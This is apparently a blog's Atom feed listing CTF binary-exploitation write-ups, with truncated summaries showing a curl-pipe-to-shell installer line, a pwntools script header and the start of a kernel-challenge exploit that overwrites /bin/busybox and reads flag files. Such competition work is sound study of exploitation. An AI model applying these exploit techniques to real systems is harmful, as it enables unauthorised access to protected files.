

<feed xmlns="http://www.w3.org/2005/Atom">
  <id>http://localhost:4000/</id>
  <title>imLZH1' Blog</title>
  <subtitle>A minimal, responsive and feature-rich Jekyll theme for technical writing.</subtitle>
  <updated>2025-02-02T22:51:16+08:00</updated>
  <author>
    <name>imLZH1</name>
    <uri>http://localhost:4000/</uri>
  </author>
  <link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml"/>
  <link rel="alternate" type="text/html" hreflang="zh-CN"
    href="http://localhost:4000/"/>
  <generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator>
  <rights> © 2025 imLZH1 </rights>
  <icon>/assets/img/favicons/favicon.ico</icon>
  <logo>/assets/img/favicons/favicon-96x96.png</logo>


  
  <entry>
    <title>HACKIM 2025 CTF 一道wasm pwn题分享</title>
    <link href="http://localhost:4000/posts/Nullcon-Goa-HackIM-2025-CTF/" rel="alternate" type="text/html" title="HACKIM 2025 CTF 一道wasm pwn题分享" />
    <published>2025-02-02T00:00:00+08:00</published>
  
    <updated>2025-02-02T00:00:00+08:00</updated>
  
    <id>http://localhost:4000/posts/Nullcon-Goa-HackIM-2025-CTF/</id>
    <content src="http://localhost:4000/posts/Nullcon-Goa-HackIM-2025-CTF/" />
    <author>
      <name>imLZH1</name>
    </author>

  
    
  

  
    <summary>
      





      wat-wasm转换

​.wat​ 文件通常是 WebAssembly (Wasm) 文本格式（WebAssembly Text Format）。如果你想在 Linux 上运行 .wat​ 文件，首先需要将它转换为 WebAssembly 二进制格式（.wasm），然后使用 WebAssembly 运行时环境（如 Node.js 或浏览器）运行它。

步骤：


  
    安装 ​wasi-sdk​​ 或 ​wasmer​​ 等工具：

    
      如果你要直接使用 WebAssembly，可以安装 wasmer​ 或 wasi-sdk​，它们提供了运行 .wasm​ 文件的功能。
    

     curl https://get.wasmer.io -sSfL | sh
    

    或者安装 wasi-sdk​ 来编译和运行 WebAssembly。
...
    </summary>
  

  </entry>

  
  <entry>
    <title>第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</title>
    <link href="http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" rel="alternate" type="text/html" title="第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路" />
    <published>2025-01-18T00:00:00+08:00</published>
  
    <updated>2025-01-18T00:00:00+08:00</updated>
  
    <id>http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</id>
    <content src="http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" />
    <author>
      <name>imLZH1</name>
    </author>

  
    
  

  
    <summary>
      





      ‍


  第八届西湖论剑·中国杭州网络安全安全技能大赛-网络攻防实战赛初赛
‍


Pwn-babytrace

‍

patch 成这样，方便调试

​​

‍


  调试脚本


# imLZH1
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recv...
    </summary>
  

  </entry>

  
  <entry>
    <title>IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</title>
    <link href="http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/" rel="alternate" type="text/html" title="IrisCTF2025-Pwn-Binary-Exploitation-WriteUps" />
    <published>2025-01-07T00:00:00+08:00</published>
  
    <updated>2025-01-07T00:00:00+08:00</updated>
  
    <id>http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/</id>
    <content src="http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/" />
    <author>
      <name>imLZH1</name>
    </author>

  
    
  

  
    <summary>
      





      
  This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” team


sqlate
int main(void) {
  
	......

    init_admin();
    login_anonymous();
	......
	do{
		......
        switch (c) {
          	......
            case '5': {
                printf("Registration is currently closed.\n\n");
                action_login();
      ...
    </summary>
  

  </entry>

  
  <entry>
    <title>2024-BRISC-CTF-Pwn-WriteUps</title>
    <link href="http://localhost:4000/posts/BRISC-CTF/" rel="alternate" type="text/html" title="2024-BRISC-CTF-Pwn-WriteUps" />
    <published>2025-01-07T00:00:00+08:00</published>
  
    <updated>2025-01-07T00:00:00+08:00</updated>
  
    <id>http://localhost:4000/posts/BRISC-CTF/</id>
    <content src="http://localhost:4000/posts/BRISC-CTF/" />
    <author>
      <name>imLZH1</name>
    </author>

  
    
  

  
    <summary>
      





      hard-physler-kernel
非预期做法


  权限没设置好，全部都时 rwx


​​

把 /bin/busybox 文件覆盖，然后 exit

​​


  exploit


#include "minilib.h"

extern void _start(){
    char *files[] = {
        "/flag",
        "/flag.txt",
        "/root/flag",
        "/root/flag.txt",
        0};

    for(int i=0;files[i];i++){
        int fd = open(files[i],0);
        if(fd&amp;gt;0){
            sendfile(1, fd, 0, 0x100);
        ...
    </summary>
  

  </entry>

  
  <entry>
    <title>2024-05-31-PHP-So-Pwn</title>
    <link href="http://localhost:4000/posts/PHP-So-Pwn/" rel="alternate" type="text/html" title="2024-05-31-PHP-So-Pwn" />
    <published>2024-05-31T00:00:00+08:00</published>
  
    <updated>2024-05-31T00:00:00+08:00</updated>
  
    <id>http://localhost:4000/posts/PHP-So-Pwn/</id>
    <content src="http://localhost:4000/posts/PHP-So-Pwn/" />
    <author>
      <name>imLZH1</name>
    </author>

  
    
    <category term="CTF" />
    
  

  
    <summary>
      





      ‍

基础的一些知识
‍


  
    最近打比赛 遇到了几道 php so 模块的 pwn 题，个人感觉挺有意思的
  
  
    一般情况下会把php 大部分函数 ban 掉，只是用 自定义so 文件里的函数
  


‍

.so 文件的导出函数

虽然里面函数名前面有zif_​ ,实际上调用的函数名是

add_chunk()
show_chunk()
edit_chunk()
edit_name()
free_chunk()


​​

‍

gdb调试方法(一种)


  可以先把本地的 gdbserver 上次到docker, 能正常运行就行了


​​


  我只开了一个 docker 环境，正常情况下，他的ip 就是 这个加1 ,也就是 172.17.0.2​


​​

​​


  然后用 gdbserver 启动


​​

​​


  上面是调试...
    </summary>
  

  </entry>

</feed>


